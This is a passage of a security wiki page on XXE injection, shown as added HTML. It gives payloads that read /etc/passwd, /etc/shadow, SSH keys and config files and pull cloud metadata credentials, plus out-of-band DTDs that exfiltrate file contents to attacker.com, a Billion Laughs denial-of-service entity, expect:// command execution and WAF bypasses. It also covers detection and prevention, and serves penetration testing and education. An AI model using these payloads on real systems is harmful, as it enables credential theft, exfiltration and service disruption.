+<li>Office document uploads (DOCX, XLSX, PPTX)</li>
+<li>SAML authentication</li>
+<li>RSS/Atom import</li>
+<li>XML-RPC endpoints</li>
+<li>Mobile application APIs</li>
+<li>PDF generators using XML</li>
+<li>Configuration import/export features</li>
+<li>Third-party XML parsers</li>
+</ul>
+<hr>
+<h2 id="exploitation-techniques">
+  Exploitation Techniques
+  <a class="anchor" href="#exploitation-techniques">#</a>
+</h2>
+<h3 id="1-quick-check-for-xxe">
+  <strong>1. Quick Check for XXE</strong>
+  <a class="anchor" href="#1-quick-check-for-xxe">#</a>
+</h3>
+<p><strong>Send this minimal payload</strong> to test if XML parsing is vulnerable:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe &#34;XXE_TEST&#34;&gt; ]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;
+</code></pre><p><strong>If output contains <code>XXE_TEST</code> → XXE is possible!</strong></p>
+<p><strong>For Blind One:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;http://collaborator-url/&#34;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>If you receive interactions on the collaborator server, XXE might be there.</p>
+<hr>
+<h3 id="2-classic-file-read-linuxwindows">
+  <strong>2. Classic File Read (Linux/Windows)</strong>
+  <a class="anchor" href="#2-classic-file-read-linuxwindows">#</a>
+</h3>
+<h3 id="linux">
+  <strong>Linux:</strong>
+  <a class="anchor" href="#linux">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;
+</code></pre><h3 id="windows">
+  <strong>Windows:</strong>
+  <a class="anchor" href="#windows">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE data [
+  &lt;!ENTITY xxe SYSTEM &#34;file:///C:/Windows/win.ini&#34;&gt;
+]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;
+</code></pre><p>✅ <strong>Look for file contents in response.</strong></p>
+<hr>
+<h3 id="3-ssrf-test-internal-network-probe">
+  <strong>3. SSRF Test (Internal Network Probe)</strong>
+  <a class="anchor" href="#3-ssrf-test-internal-network-probe">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/latest/meta-data/&gt;&#34;&gt;
+]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre><p>✅ <strong>Check for AWS/Azure/GCP metadata leaks.</strong></p>
+<h3 id="4-base64-encoded">
+  <strong>4. Base64 Encoded</strong>
+  <a class="anchor" href="#4-base64-encoded">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt; %init; ]&gt;&lt;foo/&gt;
+</code></pre><hr>
+<h2 id="advanced-xxe-attack-vectors">
+  <strong>Advanced XXE Attack Vectors</strong>
+  <a class="anchor" href="#advanced-xxe-attack-vectors">#</a>
+</h2>
+<h3 id="1-blind-xxe-with-out-of-band-oob-data-exfiltration">
+  <strong>1. Blind XXE with Out-of-Band (OOB) Data Exfiltration</strong>
+  <a class="anchor" href="#1-blind-xxe-with-out-of-band-oob-data-exfiltration">#</a>
+</h3>
+<p>When <strong>no direct response</strong> is visible, use <strong>DNS/HTTP exfiltration</strong>:</p>
+<h3 id="method-1-classic-oob-via-parameter-entities">
+  <strong>Method 1: Classic OOB via Parameter Entities</strong>
+  <a class="anchor" href="#method-1-classic-oob-via-parameter-entities">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM &#34;&lt;http://attacker.com/evil.dtd&gt;&#34;&gt;
+  %xxe;
+]&gt;&lt;foo&gt;&lt;/foo&gt;
+</code></pre><p><strong>evil.dtd</strong> (Hosted on attacker server):</p>
+<pre tabindex="0"><code>&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://attacker.com/?leak=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfil;
+</code></pre><h3 id="method-2-error-based-exfiltration">
+  <strong>Method 2: Error-Based Exfiltration</strong>
+  <a class="anchor" href="#method-2-error-based-exfiltration">#</a>
+</h3>
+<p>If HTTP exfiltration fails, force an <strong>error message</strong> containing data:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM &#34;file:///etc/shadow&#34;&gt;
+  &lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&#34;&gt;
+  %eval;
+  %error;
+]&gt;
+</code></pre><p><em>(Works if server reflects errors in responses.)</em></p>
+<h3 id="method-3-repurposing-a-local-dtd">
+  Method 3: <strong>Repurposing a local DTD</strong>
+  <a class="anchor" href="#method-3-repurposing-a-local-dtd">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE message [
+&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;
+&lt;!ENTITY % ISOamso &#39;
+&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+&#39;&gt;
+%local_dtd;
+]&gt;
+</code></pre><p>This payload will import the Yelp DTD, then redefine the <code>ISOamso</code> entity, triggering an error message containing the contents of the <code>/etc/passwd</code> file.</p>
+<hr>
+<h3 id="2-xxe-inside-non-xml-formats">
+  <strong>2. XXE Inside Non-XML Formats</strong>
+  <a class="anchor" href="#2-xxe-inside-non-xml-formats">#</a>
+</h3>
+<p>Many APIs accept <strong>JSON but parse as XML</strong> if malformed:</p>
+<h3 id="json--xxe-conversion-trick">
+  <strong>JSON → XXE Conversion Trick</strong>
+  <a class="anchor" href="#json--xxe-conversion-trick">#</a>
+</h3>
+<pre tabindex="0"><code>{
+  &#34;test&#34;: &#34;valid JSON&#34;,
+  &#34;malicious&#34;: &#34;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#34;
+}
+</code></pre><p><em>(If the backend uses <strong>libxml</strong>, it may parse embedded XML!)</em></p>
+<h3 id="xxe-in-svg-files">
+  <strong>XXE in SVG Files</strong>
+  <a class="anchor" href="#xxe-in-svg-files">#</a>
+</h3>
+<p>SVG is XML-based:</p>
+<pre tabindex="0"><code>&lt;svg xmlns=&#34;&lt;http://www.w3.org/2000/svg&gt;&#34; width=&#34;100&#34; height=&#34;100&#34;&gt;
+  &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+  &lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+</code></pre><p><em>(Upload this SVG to test for XXE.)</em></p>
+<hr>
+<h3 id="3-xxe-via-xinclude-bypass-dtd-blocks">
+  <strong>3. XXE via XInclude (Bypass DTD Blocks)</strong>
+  <a class="anchor" href="#3-xxe-via-xinclude-bypass-dtd-blocks">#</a>
+</h3>
+<p>If direct DTD is blocked, use <strong>XInclude</strong>:</p>
+<pre tabindex="0"><code>&lt;foo xmlns:xi=&#34;&lt;http://www.w3.org/2001/XInclude&gt;&#34;&gt;&lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/passwd&#34;/&gt;&lt;/foo&gt;
+</code></pre><p><em>(Works in <strong>docx, xlsx, XML-based APIs</strong>.)</em></p>
+<hr>
+<h3 id="4-xxe-in-soap-requests">
+  <strong>4. XXE in SOAP Requests</strong>
+  <a class="anchor" href="#4-xxe-in-soap-requests">#</a>
+</h3>
+<p>SOAP APIs often parse XML:</p>
+<pre tabindex="0"><code>&lt;soap:Envelope xmlns:soap=&#34;&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;&#34;&gt;&lt;soap:Body&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
+</code></pre><hr>
+<h3 id="5-xxe-for-rce-rare-but-possible">
+  <strong>5. XXE for RCE (Rare but Possible)</strong>
+  <a class="anchor" href="#5-xxe-for-rce-rare-but-possible">#</a>
+</h3>
+<h3 id="phpexpectwrapper">
+  <strong>PHP <code>expect://</code> Wrapper</strong>
+  <a class="anchor" href="#phpexpectwrapper">#</a>
+</h3>
+<p><em>(Requires <strong><code>expect</code></strong> module enabled)</em></p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &#34;expect://id&#34;&gt;
+]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre><hr>
+<h3 id="6-billion-laugh-attack">
+  6. <strong>Billion Laugh Attack</strong>
+  <a class="anchor" href="#6-billion-laugh-attack">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE data [
+&lt;!ENTITY a0 &#34;dos&#34; &gt;
+&lt;!ENTITY a1 &#34;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&#34;&gt;
+&lt;!ENTITY a2 &#34;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&#34;&gt;
+&lt;!ENTITY a3 &#34;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&#34;&gt;
+&lt;!ENTITY a4 &#34;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&#34;&gt;
+]&gt;
+&lt;data&gt;&amp;a4;&lt;/data&gt;
+</code></pre><h3 id="xslt-based-rce">
+  <strong>XSLT-Based RCE</strong>
+  <a class="anchor" href="#xslt-based-rce">#</a>
+</h3>
+<p>If XSLT processing is enabled:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; ?&gt;
+&lt;xsl:stylesheet version=&#34;1.0&#34; xmlns:xsl=&#34;&lt;http://www.w3.org/1999/XSL/Transform&gt;&#34;&gt;&lt;xsl:template match=&#34;/&#34;&gt;&lt;xsl:value-of select=&#34;system-property(&#39;user.dir&#39;)&#34;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;
+</code></pre><hr>
+<h3 id="7-bypassing-wafs--filters">
+  <strong>7. Bypassing WAFs &amp; Filters</strong>
+  <a class="anchor" href="#7-bypassing-wafs--filters">#</a>
+</h3>
+<h3 id="utf-7-bypass">
+  <strong>UTF-7 Bypass</strong>
+  <a class="anchor" href="#utf-7-bypass">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4-
+</code></pre><h3 id="cdata--utf-16-bypass">
+  <strong>CDATA + UTF-16 Bypass</strong>
+  <a class="anchor" href="#cdata--utf-16-bypass">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16BE&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre><h3 id="dtd-in-external-url-with-obfuscation">
+  <strong>DTD in External URL with Obfuscation</strong>
+  <a class="anchor" href="#dtd-in-external-url-with-obfuscation">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo SYSTEM &#34;&lt;http://attacker.com/evil.dtd&gt;&#34;&gt;
+</code></pre><p><em>(Some WAFs miss external DTD references.)</em></p>
+<hr>
+<h3 id="8-xxe-in-cloud-environments">
+  <strong>8. XXE in Cloud Environments</strong>
+  <a class="anchor" href="#8-xxe-in-cloud-environments">#</a>
+</h3>
+<h3 id="aws-metadata-ssrf">
+  <strong>AWS Metadata SSRF</strong>
+  <a class="anchor" href="#aws-metadata-ssrf">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/&gt;&#34;&gt;
+]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre><h3 id="azure-metadata">
+  <strong>Azure Metadata</strong>
+  <a class="anchor" href="#azure-metadata">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/metadata/instance?api-version=2021-02-01&gt;&#34;&gt;
+</code></pre><h3 id="gcp-metadata">
+  <strong>GCP Metadata</strong>
+  <a class="anchor" href="#gcp-metadata">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;&lt;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&gt;&#34;&gt;
+</code></pre><hr>
+<h3 id="9-via-changing-content-type">
+  9. <strong>Via Changing Content-Type</strong>
+  <a class="anchor" href="#9-via-changing-content-type">#</a>
+</h3>
+<p>Content-Type: From x-www-urlencoded to XML</p>
+<p>If a POST request accepts the data in XML format, try changing the content-type to xml.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>foo=bar
+</span></span></code></pre></div><p>Send the request in XML format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
+</span></span><span style="display:flex;"><span>Content-Type: text/xml
+</span></span><span style="display:flex;"><span>Content-Length: 52
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span><span style="color:#f92672">&lt;foo&gt;</span>bar<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><hr>
+<h2 id="framework-specific-scenarios">
+  Framework-Specific Scenarios
+  <a class="anchor" href="#framework-specific-scenarios">#</a>
+</h2>
+<h3 id="java">
+  Java
+  <a class="anchor" href="#java">#</a>
+</h3>
+<ul>
+<li>JAXB</li>
+<li>SAX</li>
+<li>DOM</li>
+<li>StAX</li>
+<li>XMLDecoder</li>
+</ul>
+<p>Common issue:
+External entities enabled by default.</p>
+<hr>
+<h3 id="php">
+  PHP
+  <a class="anchor" href="#php">#</a>
+</h3>
+<p>Common vulnerable functions:</p>
+<ul>
+<li>simplexml_load_string()</li>
+<li>DOMDocument::loadXML()</li>
+<li>XMLReader</li>
+</ul>
+<p>Useful wrappers:</p>
+<ul>
+<li>php://filter</li>
+<li>expect://</li>
+</ul>
+<hr>
+<h3 id="net">
+  .NET
+  <a class="anchor" href="#net">#</a>
+</h3>
+<p>Classes:</p>
+<ul>
+<li>XmlDocument</li>
+<li>XmlReader</li>
+<li>XDocument</li>
+</ul>
+<p>Older .NET versions are commonly vulnerable when DTD processing is enabled.</p>
+<hr>
+<h3 id="python">
+  Python
+  <a class="anchor" href="#python">#</a>
+</h3>
+<p>Libraries:</p>
+<ul>
+<li>lxml</li>
+<li>xml.etree</li>
+<li>minidom</li>
+</ul>
+<p>Safe alternative:</p>
+<ul>
+<li>defusedxml</li>
+</ul>
+<hr>
+<h3 id="nodejs">
+  Node.js
+  <a class="anchor" href="#nodejs">#</a>
+</h3>
+<p>Libraries:</p>
+<ul>
+<li>libxmljs</li>
+<li>xmldom</li>
+<li>xml2js</li>
+</ul>
+<hr>
+<h2 id="real-world-exploitation-scenarios">
+  <strong>Real-World Exploitation Scenarios</strong>
+  <a class="anchor" href="#real-world-exploitation-scenarios">#</a>
+</h2>
+<h3 id="1-stealing-ssh-keys">
+  <strong>1. Stealing SSH Keys</strong>
+  <a class="anchor" href="#1-stealing-ssh-keys">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///home/user/.ssh/id_rsa&#34;&gt;
+</code></pre><h3 id="2-reading-database-credentials">
+  <strong>2. Reading Database Credentials</strong>
+  <a class="anchor" href="#2-reading-database-credentials">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///var/www/html/config.php&#34;&gt;
+</code></pre><h3 id="3-exploiting-windows-systems">
+  <strong>3. Exploiting Windows Systems</strong>
+  <a class="anchor" href="#3-exploiting-windows-systems">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///C:/Windows/System32/drivers/etc/hosts&#34;&gt;
+</code></pre><h3 id="4-abusing-php-wrappers">
+  <strong>4. Abusing PHP Wrappers</strong>
+  <a class="anchor" href="#4-abusing-php-wrappers">#</a>
+</h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;
+</code></pre><h3 id="5-xxe-in-pdf-generators">
+  <strong>5. XXE in PDF Generators</strong>
+  <a class="anchor" href="#5-xxe-in-pdf-generators">#</a>
+</h3>
+<p>Many PDF generators (like <strong>Apache FOP</strong>) parse XML:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foobar [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foobar&gt;&amp;xxe;&lt;/foobar&gt;
+</code></pre><hr>
+<h3 id="6-xxe-oob-with-apache-karaf">
+  <strong>6. XXE OOB with Apache Karaf</strong>
+  <a class="anchor" href="#6-xxe-oob-with-apache-karaf">#</a>
+</h3>
+<p>CVE-2018-11788 affecting versions:</p>
+<ul>
+<li>Apache Karaf &lt;= 4.2.1</li>
+<li>Apache Karaf &lt;= 4.1.6</li>
+</ul>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;&lt;http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com&gt;&#34;&gt; %dtd;]
+&lt;features name=&#34;my-features&#34; xmlns=&#34;&lt;http://karaf.apache.org/xmlns/features/v1.3.0&gt;&#34; xmlns:xsi=&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;
+        xsi:schemaLocation=&#34;&lt;http://karaf.apache.org/xmlns/features/v1.3.0&gt; &lt;http://karaf.apache.org/xmlns/features/v1.3.0&gt;&#34;&gt;
+    &lt;feature name=&#34;deployer&#34; version=&#34;2.0&#34; install=&#34;auto&#34;&gt;
+    &lt;/feature&gt;
+&lt;/features&gt;
+</code></pre><hr>
+<h2 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Payload</th>
+<th>Expected Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Internal Entity</td>
+<td><code>&lt;!ENTITY test &quot;hello&quot;&gt;</code></td>
+<td>Response contains <code>hello</code></td>
+</tr>
+<tr>
+<td>File Read</td>
+<td><code>file:///etc/passwd</code></td>
+<td>File contents returned</td>
+</tr>
+<tr>
+<td>Windows File Read</td>
+<td><code>file:///C:/Windows/win.ini</code></td>
+<td>File contents returned</td>
+</tr>
+<tr>
+<td>Blind XXE</td>
+<td>Collaborator URL</td>
+<td>DNS/HTTP interaction</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>Metadata endpoint</td>
+<td>Metadata returned</td>
+</tr>
+<tr>
+<td>XInclude</td>
+<td><code>&lt;xi:include&gt;</code></td>
+<td>File contents returned</td>
+</tr>
+<tr>
+<td>External DTD</td>
+<td>Remote DTD</td>
+<td>Remote request observed</td>
+</tr>
+<tr>
+<td>SVG Upload</td>
+<td>XXE SVG</td>
+<td>File disclosure/OOB</td>
+</tr>
+<tr>
+<td>SOAP XXE</td>
+<td>SOAP request</td>
+<td>XXE triggered</td>
+</tr>
+<tr>
+<td>Billion Laughs</td>
+<td>Recursive entities</td>
+<td>Parser DoS</td>
+</tr>
+<tr>
+<td>PHP Wrapper</td>
+<td><code>php://filter</code></td>
+<td>Base64 encoded source</td>
+</tr>
+<tr>
+<td>expect://</td>
+<td><code>expect://id</code></td>
+<td>Command output (rare)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="detection-techniques">
+  Detection Techniques
+  <a class="anchor" href="#detection-techniques">#</a>
+</h2>
+<h3 id="manual-detection">
+  Manual Detection
+  <a class="anchor" href="#manual-detection">#</a>
+</h3>
+<ul>
+<li>Check Content-Type negotiation</li>
+<li>Try XML instead of JSON</li>
+<li>Inject internal entities</li>
+<li>Test external entities</li>
+<li>Test XInclude</li>
+<li>Upload SVG</li>
+<li>Test SOAP endpoints</li>
+<li>Monitor Collaborator</li>
+<li>Trigger parser errors</li>
+</ul>
+<h3 id="automated-detection">
+  Automated Detection
+  <a class="anchor" href="#automated-detection">#</a>
+</h3>
+<ul>
+<li>Burp Suite Scanner</li>
+<li>Burp Collaborator</li>
+<li>XXEinjector</li>
+<li>Nuclei XXE templates</li>
+<li>XXE OOB Server</li>
+<li>OWASP ZAP</li>
+</ul>
+<hr>
+<h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<p>Successful XXE may lead to:</p>
+<ul>
+<li>Local file disclosure</li>
+<li>Blind data exfiltration</li>
+<li>Server-Side Request Forgery (SSRF)</li>
+<li>Cloud credential disclosure</li>
+<li>Internal network scanning</li>
+<li>Authentication bypass (rare)</li>
+<li>Denial of Service</li>
+<li>Source code disclosure</li>
+<li>Configuration disclosure</li>
+<li>Remote Code Execution (rare)</li>
+</ul>
+<hr>
+<h2 id="prevention-techniques">
+  <strong>Prevention Techniques</strong>
+  <a class="anchor" href="#prevention-techniques">#</a>
+</h2>
+<ul>
+<li><strong>Disable DTDs entirely</strong> (most secure option).</li>
+<li><strong>Use JSON instead of XML</strong> where possible.</li>
+<li><strong>Patch XML libraries</strong> (e.g., <strong><code>libxml2 ≥ 2.9.0</code></strong>).</li>
+<li><strong>WAF Rules</strong> to block <strong><code>&lt;!ENTITY</code></strong> and <strong><code>SYSTEM</code></strong> keywords.</li>
+<li><strong>Input Sanitization</strong> for XML uploads.</li>
+<li>Disable external entity resolution.</li>
+<li>Disable XInclude processing if unused.</li>
+<li>Disable XML Schema external references.</li>
+<li>Disable unnecessary XML support.</li>
+<li>Use secure parser configurations.</li>
+<li>Validate uploaded XML against schemas.</li>
+<li>Apply least privilege to file system access.</li>
+</ul>
+<hr>
+<h2 id="tools">
+  <strong>Tools</strong>
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Tool</strong></th>
+<th><strong>Purpose</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>XXEinjector</strong></td>
+<td>Automated OOB XXE testing</td>
+</tr>
+<tr>
+<td><strong>Burp Collaborator</strong></td>
+<td>OOB detection</td>
+</tr>
+<tr>
+<td><strong>OOB-Server</strong></td>
+<td>Self-hosted XXE listener</td>
+</tr>
+<tr>
+<td><strong>Wfuzz</strong></td>
+<td>Fuzzing XML endpoints</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<h3 id="real-cves">
+  Real CVEs
+  <a class="anchor" href="#real-cves">#</a>
+</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805" target="_blank" rel="noreferrer noopener nofollow">CVE-2017-9805 (Apache Struts)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2018-11788" target="_blank" rel="noreferrer noopener nofollow">CVE-2018-11788 (Apache Karaf)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2014-3660" target="_blank" rel="noreferrer noopener nofollow">CVE-2014-3660 (libxml2)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h3 id="hackerone-reports">
+  Hackerone Reports:
+  <a class="anchor" href="#hackerone-reports">#</a>
+</h3>
+<p><a href="https://hackerone.com/reports/2573567" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/2573567</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://hackerone.com/reports/312543" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/312543</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://hackerone.com/reports/836877" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/836877</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<h2 id="references">
+  <strong>References:</strong>
+  <a class="anchor" href="#references">#</a>
+</h2>
+<p><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/xxe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noreferrer noopener nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html" target="_blank" rel="noreferrer noopener nofollow">https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83" target="_blank" rel="noreferrer noopener nofollow">https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://workbook.securityboat.net/Pentesting/Web%20Application/xxe/#workshoplabs" target="_blank" rel="noreferrer noopener nofollow">https://workbook.securityboat.net/Pentesting/Web Application/xxe/#workshoplabs</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.cobalt.io/blog/how-to-execute-an-xml-external-entity-injection-xxe" target="_blank" rel="noreferrer noopener nofollow">https://www.cobalt.io/blog/how-to-execute-an-xml-external-entity-injection-xxe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities" target="_blank" rel="noreferrer noopener nofollow">https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://medium.com/@ajaikumarnadar_71386/code-review-guide-xml-external-entity-xxe-injection-part-8-be5727ca397e" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@ajaikumarnadar_71386/code-review-guide-xml-external-entity-xxe-injection-part-8-be5727ca397e</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/XXE%20%28XML%20External%20Entities%29.md" target="_blank" rel="noopener">
